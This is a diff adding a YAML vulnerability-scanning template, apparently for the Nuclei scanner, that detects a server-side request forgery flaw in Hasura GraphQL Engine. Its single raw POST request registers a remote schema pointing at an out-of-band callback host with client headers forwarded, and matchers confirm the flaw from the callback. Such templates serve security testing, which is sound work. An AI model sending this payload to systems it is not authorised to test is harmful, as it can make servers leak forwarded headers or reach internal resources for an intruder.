@@ -1,0 +1,51 @@
+id: hasura-graphql-ssrf
+
+info:
+  name: Hasura GraphQL Engine - Server Side Request Forgery
+  author: princechaddha
+  severity: high
+  description: Hasura GraphQL Engine is vulnerable to SSRF( Server Side Request Forgery )
+  reference:
+    - https://cxsecurity.com/issue/WLB-2021040115
+  metadata:
+    max-request: 1
+  tags: hasura,ssrf,graphql
+
+http:
+  - raw:
+      - |
+        POST /v1/query HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: */*
+
+        {
+           "type":"bulk",
+           "args":[
+              {
+                 "type":"add_remote_schema",
+                 "args":{
+                    "name":"test",
+                    "definition":{
+                       "url":"https://{{interactsh-url}}",
+                       "headers":[
+                       ],
+                       "timeout_seconds":60,
+                       "forward_client_headers":true
+                    }
+                 }
+              }
+           ]
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+# digest: 4b0a00483046022100def42025747e0848067fc5f8c44cbde62ac0e84d91fb2fbd5330318c2e52107b022100b202ad98d3835873d915d59d8169fd138ca7f42b009a5e33f6e5ca14416003aa:922c64590222798bb761d5b6d8e72950
